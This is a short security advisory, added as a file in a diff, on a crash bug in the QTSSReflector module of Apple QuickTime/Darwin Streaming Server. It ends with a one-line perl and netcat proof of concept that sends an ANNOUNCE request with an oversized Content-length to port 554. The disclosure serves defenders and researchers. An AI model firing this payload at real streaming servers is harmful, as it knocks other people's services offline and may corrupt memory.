@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/7659/info
+
+A vulnerability has been reported for Apple QuickTime/Darwin Streaming Server. The problem is said to occur within the QTSSReflector module while processing the ANNOUNCE command. Specifically, by specifying an extremely large value as an argument within an ANNOUNCE request, it is possible to trigger an unexpected calculation causing the server to crash.
+
+Although it has not been confirmed, it is speculated that this issue may be exploitable to corrupt memory. 
+
+$ perl -e 'print "ANNOUNCE /.sdp RTSP/1.0\nContent-length:4294967295\n\n","A"x8192' | nc -v localhost 554 
